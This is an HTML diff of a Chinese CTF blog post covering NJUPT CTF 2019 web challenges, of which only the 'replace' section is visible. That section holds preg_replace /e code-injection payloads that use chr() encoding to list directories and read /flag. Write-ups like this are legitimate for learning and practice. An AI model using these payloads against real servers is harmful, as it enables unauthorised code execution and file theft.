 <p><img src="1574779072769.png" alt="1574779072769"></p>
 <h1 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h1><p>这个题当时想到了是preg_replace()函数/e下的命令执行，随便测了下，没发现什么就没看了，现在发现其实也挺简单的，测试发现过滤了一些函数和引号，这里先给出payload，具体总结会在之后的文章，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=<span class="number">1</span>&amp;pat=<span class="number">1</span>&amp;rep=var_dump(scandir(chr(<span class="number">46</span>).chr(<span class="number">46</span>).chr(<span class="number">47</span>).chr(<span class="number">46</span>).chr(<span class="number">46</span>).chr(<span class="number">47</span>).chr(<span class="number">46</span>).chr(<span class="number">46</span>).chr(<span class="number">47</span>)));	<span class="comment">//遍历目录</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub=<span class="number">1</span>&amp;pat=<span class="number">1</span>&amp;rep=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">108</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>)))	<span class="comment">//读取flag</span></span><br></pre></td></tr></table></figure>
-
-
-
+<pre class=" language-php"><code class="language-php">sub<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>pat<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rep<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//遍历目录</span></code></pre>
+<pre class=" language-php"><code class="language-php">sub<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>pat<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>rep<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//读取flag</span></code></pre>
 <p>这些题涉及挺多知识的，等过几天有空把做题经常遇到的知识总结一下。</p>
 
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Li1M.github.io" rel="external nofollow noreferrer">LiM</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://Li1M.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/">https://Li1M.github.io/2019/11/24/NJUPT%20CTF%202019%20web%E9%83%A8%E5%88%86writeup/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="https://Li1M.github.io" target="_blank">LiM</a>
+                    !
+                </span>
+            </div>
+        
     </div>
 
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
     
     
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
     
-        
-      
 
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i># CTF</a>
-            
-              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i># web</a>
-            
-          </div>
-        
+    
 
-        
+</div>
 
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/11/19/upload-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/" rel="next" title="upload-libs通关笔记">
-                  <i class="fa fa-chevron-left"></i> upload-libs通关笔记
-                </a>
-              
+                </div>
             </div>
-
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/11/25/EIS-2019-web-writeup/" rel="prev" title="EIS 2019 web writeup">
-                  EIS 2019 web writeup <i class="fa fa-chevron-right"></i>
-                </a>
-              
-            </div>
-          </div>
-        
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-
+            
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
+    </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fake-XML-cookbook"><span class="nav-number">1.</span> <span class="nav-text">Fake XML cookbook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyphp"><span class="nav-number">2.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Upload-your-Shell"><span class="nav-number">3.</span> <span class="nav-text">Upload your Shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hacker-backdoor"><span class="nav-number">4.</span> <span class="nav-text">hacker_backdoor</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flask"><span class="nav-number">5.</span> <span class="nav-text">flask</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#True-XML-cookbook"><span class="nav-number">6.</span> <span class="nav-text">True XML cookbook</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#replace"><span class="nav-number">7.</span> <span class="nav-text">replace</span></a></li></ol></div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">LiM</p>
-  <div class="site-description" itemprop="description">念念不忘，必有回响</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">20</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
     
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-          
-            <a href="/tags/">
-          
-        
-        <span class="site-state-item-count">8</span>
-        <span class="site-state-item-name">tags</span>
-        </a>
-      </div>
+
     
-  </nav>
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2019/11/25/EIS-2019-web-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="EIS 2019 web writeup">
+                        
+                        <span class="card-title">EIS 2019 web writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            本来可以尝试着写一下的，可惜那天都在上课，这里做一下记录
+ezbypass它给了一个shell，无法执行命令，要bypass open_basedir，这个上次有遇到过，写个shell在/tmp/目录下(通过利用环境变量 LD_PRELOA
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-11-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            LiM
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/11/19/upload-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="upload-libs通关笔记">
+                        
+                        <span class="card-title">upload-libs通关笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            LiM
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/upload/">
+                        <span class="chip bg-color">upload</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
 </div>
 
 
 
-      </div>
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">LiM</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-area-chart"></i>
-    </span>
-      <span class="post-meta-item-text">Symbols count total: </span>
-    
-    <span title="Symbols count total">104k</span>
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span class="post-meta-item-text">Reading time total &asymp;</span>
-    
-    <span title="Reading time total">1:34</span>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
-  </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">
-      
-    Theme – <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.2
-  </div>
 
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-user"></i>
-      </span>
-      <span class="site-uv" title="Total Visitors">
-        <span id="busuanzi_value_site_uv"></span>
-      </span>
-    </span>
-  
-    <span class="post-meta-divider">|</span>
-  
-    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-      <span class="post-meta-item-icon">
-        <i class="fa fa-eye"></i>
-      </span>
-      <span class="site-pv" title="Total Views">
-        <span id="busuanzi_value_site_pv"></span>
-      </span>
-    </span>
-  
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
 </div>
 
 
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
 
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
 
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
 
-
-
-
-
-
-
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
 
         
-      </div>
-    </footer>
-  </div>
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
 
-  
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
     
-  
-  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
-<script src="/js/schemes/pisces.js?v=7.4.2"></script>
-<script src="/js/next-boot.js?v=7.4.2"></script>
+
+</main>
 
 
 
-  
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://Li1M.github.io" target="_blank">LiM</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">23.4k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
 
 
 
@@ -667,26 +981,91 @@
 
 
 
-  <script src="/js/local-search.js?v=7.4.2"></script>
 
 
 
 
 
 
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
 
 
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
 
 
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
 
+    <!-- Baidu Analytics -->
 
+    <!-- Baidu Push -->
 
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
 
-  
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
 
-  
+    
 
-  
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
 
 </body>
+
 </html>
